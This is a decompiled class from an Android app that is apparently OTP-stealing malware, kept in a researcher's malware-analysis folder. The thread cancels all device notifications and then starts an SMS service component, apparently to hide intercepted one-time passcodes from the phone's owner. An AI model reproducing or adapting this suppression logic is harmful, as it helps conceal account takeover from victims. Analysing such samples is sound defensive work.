import android.app.NotificationManager;
import android.content.Context;
import android.database.SQLException;
import com.soft360.iService.AService;
import com.soft360.iService.Alarm;
import java.net.ConnectException;

public final class cB
  extends Thread
{
  public Context a;
  
  public cB(Alarm paramAlarm) {}
  
  public final void run()
  {
    super.run();
    new Thread(new cC(this));
    try
    {
      ((NotificationManager)this.jdField_a_of_type_AndroidContentContext.getSystemService("notification")).cancelAll();
      try
      {
        eu localeu = eu.a(AService.a);
        localeu.a(this.jdField_a_of_type_AndroidContentContext);
        localeu.a();
        return;
      }
      catch (ConnectException localConnectException)
      {
        new StringBuilder("Alarm isSMSServThread").append(localConnectException.toString()).toString();
        new StringBuilder("Alarm 1 ").append(localConnectException.toString()).toString();
        return;
      }
      catch (SQLException localSQLException)
      {
        new StringBuilder("Alarm isSMSServThread").append(localSQLException.toString()).toString();
        new StringBuilder("Alarm 2 ").append(localSQLException.toString()).toString();
        return;
      }
      catch (Exception localException1)
      {
        new StringBuilder("Alarm isSMSServThread").append(localException1.toString()).toString();
        new StringBuilder("Alarm 3 ").append(localException1.toString()).toString();
        return;
      }
    }
    catch (Exception localException2)
    {
      for (;;) {}
    }
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/fb_otp/classes-dex2jar.jar!/cB.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */